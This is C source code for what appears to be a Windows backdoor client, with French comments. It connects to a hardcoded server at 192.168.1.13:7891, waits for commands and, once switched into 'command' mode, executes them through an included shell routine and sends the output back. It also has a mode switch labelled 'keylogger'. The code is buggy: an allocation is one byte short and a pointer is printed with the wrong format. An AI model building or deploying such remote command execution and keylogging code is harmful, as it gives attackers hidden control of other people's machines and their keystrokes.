#include <stdio.h>		
#include <stdlib.h>
#include <string.h>

#include "shell.c"

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
int main()
{
    WSADATA WSAData;
    SOCKET sock;
    SOCKADDR_IN sin;
    char buffer[255];
    char sentence[1040];
    char* command = NULL;
    char mode[20]= "none";
   
    WSAStartup(MAKEWORD(2,0), &WSAData);
    /* Tout est configuré pour se connecter sur IRC, haarlem, Undernet. */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    sin.sin_addr.s_addr = inet_addr("192.168.1.13");
    sin.sin_family = AF_INET;
    sin.sin_port = htons(7891);

    connect(sock, (SOCKADDR *)&sin, sizeof(sin));
	//Empyty buffer;
	memset(buffer, 0, sizeof(buffer));
	while(1){
		memset(buffer, 0, sizeof(buffer));
		puts  ("buffer before recv");
		puts  (buffer);
		int n=	recv(sock, buffer, sizeof(buffer)-1, 0);
		if(n<0){
		 puts("failed to received data");
		}
		//buffer[n] = '\0';
		
		puts("command received : ");
		printf("buffer is : %s \n", buffer);
		//Si mode commande, execution de la commande via le script shell.c
		if(strcmp(mode,"command") == 0){
			printf("appel de la fonction shell\n");
			command = malloc((strlen(buffer))*sizeof(char)); //allocation du pointer
			strcpy(command,buffer);
			printf("go\n");
			printf("command envoyée : %d\n", command );
			char* path = shellcommand(command);
			printf("le path est : %s\n", path);
			send(sock, path, (strlen(path))*sizeof(char), 0);
		}	 
		//Fixe le mode en fonction de la commande envoyée
		//si command, on passen mode commande
		if(strcmp(buffer,"command\n") == 0){
			strcpy(mode,"command");
			char message[] = "client passe en mode commande\n";
			send(sock,message,strlen(message),0);	
			printf("%s\n", "command mode, message sent");
			printf("strcmp(mode,command) : %d\n",strcmp(mode,"command"));
			
		
		}
		else if(strcmp(buffer,"keylogger") == 0){
			strcpy(mode,buffer);
			char message[] = "mode keylogger active\n";
			send(sock,message,strlen(message),0);	
		}
		else if(strcmp(buffer,"back") == 0){
			strcpy(mode,"none");
			char message[] = "everything is desactivated \n";
			send(sock,message,strlen(message),0);	
		}
	}
    closesocket(sock);
    WSACleanup();
    return 0;
}
